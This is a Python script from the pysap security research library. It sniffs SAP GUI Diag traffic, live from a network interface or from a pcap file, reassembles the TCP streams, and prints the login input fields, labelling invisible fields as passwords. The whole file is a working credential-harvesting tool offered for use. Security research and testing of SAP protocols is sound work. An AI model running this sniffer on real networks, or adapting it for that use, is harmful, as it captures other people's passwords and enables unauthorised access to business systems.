#!/usr/bin/env python2
# encoding: utf-8
# pysap - Python library for crafting SAP's network protocols packets
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# Author:
#   Martin Gallo (@martingalloar)
#   Code contributed by SecureAuth to the OWASP CBAS project
#

# Standard imports
import logging
import itertools
from struct import unpack
from argparse import ArgumentParser
# External imports
import scapy.arch
from scapy.config import conf
from scapy.sendrecv import sniff
from scapy.layers.inet import IP, TCP
from scapy.arch import get_if_list, get_if_addr
from scapy.packet import bind_layers, split_layers, Raw
# Custom imports
import pysap
from pysap.SAPNI import SAPNI
from pysap.SAPDiag import SAPDiag, SAPDiagDP
from pysap.SAPDiagItems import *


# Bind the SAPDiag layer
bind_layers(SAPNI, SAPDiag,)
bind_layers(SAPNI, SAPDiagDP,)
bind_layers(SAPDiagDP, SAPDiag,)
bind_layers(SAPDiag, SAPDiagItem,)
bind_layers(SAPDiagItem, SAPDiagItem,)
# Unbind the SAPNI layer so we can perform the reassemble
split_layers(TCP, SAPNI, dport=3200)


# Set the verbosity to 0
conf.verb = 0


class DiagParser(object):

    packets_metadata = {}

    def __init__(self, options):
        self.options = options
        self.port = options.port

    def parse_packet(self, pkt):
        if TCP in pkt and Raw in pkt and self.port in [pkt[TCP].sport,
                                                       pkt[TCP].dport]:
            key = ["%s_%d" % (pkt[IP].src, pkt[TCP].sport),
                   "%s_%d" % (pkt[IP].dst, pkt[TCP].dport)]
            key.sort()
            key = "_".join(key)
            if key not in self.packets_metadata:
                self.packets_metadata[key] = []
            self.packets_metadata[key].append((pkt[TCP].seq + pkt[TCP].ack,
                                               str(pkt[Raw].load)))

    def reassemble(self):
        # Build a stream of packets for each connection
        streams = {}
        for key, value in list(self.packets_metadata.items()):
            value.sort()
            value = list(value for value, _ in itertools.groupby(value))
            streams[key] = ''
            for pkts in sorted(value):
                streams[key] += pkts[1]

        # Parse the NI packets in each stream
        packets = {}
        for key, stream in list(streams.items()):
            packets[key] = []
            while stream:
                length = unpack("!I", stream[:4])[0]
                packets[key].append(SAPNI(stream[:length + 4]))
                stream = stream[length + 4:]

        # Parse the input fields on each packet
        for key in list(packets.keys()):
            print("[*] Conversation between %s (%d NI packets)" % ("%s:%s and %s:%s" % tuple(key.split("_")),
                                                                   len(packets[key])))
            for packet in packets[key]:
                self.parse_fields(packet)

    def parse_fields(self, pkt):
        if SAPDiag in pkt and pkt[SAPDiag].message:
            atoms = pkt[SAPDiag].get_item(["APPL", "APPL4"], "DYNT", "DYNT_ATOM")
            # Print the Atom items information
            if atoms:
                print("[*] Input fields:")
                for atom in [atom for atom_item in atoms for atom in atom_item.item_value.items]:
                    if atom.etype in [121, 122, 123, 130, 131, 132]:
                        text = atom.field1_text or atom.field2_text
                        text = text.strip()
                        if "@\Q" in text:
                            parts = text.split("@")
                            try:
                                text = "%s (hint: %s)" % (parts[2], parts[1])
                            except IndexError:
                                pass
                        if atom.attr_DIAG_BSD_INVISIBLE and len(text) > 0:
                            # If the invisible flag was set, we're probably
                            # dealing with a password field
                            print("[*]\tPassword field:\t%s" % text)
                        else:
                            print("[*]\tRegular field:\t%s" % text)


# Command line options parser
def parse_options():

    description = "This example script can be used to grab SAP GUI login credentials from a pcap file or by sniffing " \
                  "on a network interface."

    usage = "%(prog)s [options] [-i <interface> | -f <pcap file>]"

    parser = ArgumentParser(usage=usage, description=description, epilog=pysap.epilog)

    target = parser.add_argument_group("Target")
    target.add_argument("-i", "--interface", dest="interface", help="Choose an interface")
    target.add_argument("-f", "--file", dest="pcap", metavar="FILE", help="Parse info from a pcap file")
    target.add_argument("-p", "--port", dest="port", type=int, default=3200, help="Port to use as filter [%(default)d]")

    misc = parser.add_argument_group("Misc options")
    misc.add_argument("-v", "--verbose", dest="verbose", action="store_true", help="Verbose output")

    options = parser.parse_args()

    return options


# Main function
def main():
    options = parse_options()

    if options.verbose:
        logging.basicConfig(level=logging.DEBUG)

    parser = DiagParser(options)

    def print_interfaces():
        print("[*] Available interfaces:")
        for iface in get_if_list():
            print("[ ]\t%s (%s)" % (iface, get_if_addr(iface)))

    if not (options.interface or options.pcap):
        print("[*] Must provide a pcap file or an interface to sniff on")
        print_interfaces()
        return

    if options.pcap:
        print("[*] Parsing pcap file (%s)" % options.pcap)
    else:
        if options.interface not in get_if_list():
            print("[*] Invalid interface '%s'" % options.interface)
            print_interfaces()
            return
        print("[*] Listening on interface (%s)" % options.interface)

    try:
        sniff(iface=options.interface, offline=options.pcap, prn=parser.parse_packet, store=0)
    except KeyboardInterrupt:
        pass

    print("[*] Finished parsing/sniffing")
    parser.reassemble()


if __name__ == "__main__":
    main()
